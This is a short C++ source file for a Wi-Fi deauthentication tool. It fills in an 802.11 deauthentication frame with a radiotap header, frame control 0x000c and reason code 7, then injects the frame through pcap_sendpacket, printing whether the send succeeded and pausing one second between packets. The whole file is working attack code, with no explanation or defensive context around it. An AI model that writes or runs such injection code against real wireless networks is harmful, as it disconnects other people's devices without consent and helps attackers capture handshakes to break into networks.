#include "deauth.h"
#include <unistd.h>
#include <pcap.h>

void Deauth::initialize()
{
    this->deauth_packet.radiotap = this->static_radiotap_h;
    this->deauth_packet.common_dot11 = 0x000c;
    this->deauth_packet.duration = 314;
    this->deauth_packet.number = 0;
    this->deauth_packet.fixed_param = 0x0007;
}

Deauth::Deauth()
{
    this->initialize();
}

void Deauth::send_packet(pcap_t *pcap, const u_char *packet_data)
{
    if(pcap_sendpacket(pcap, packet_data, 0x26) != 0)
        puts("[*] Send Deauth Packet : Fail");
    else
        puts("[*] Send Deauth Packet : Success");
    sleep(1);
}

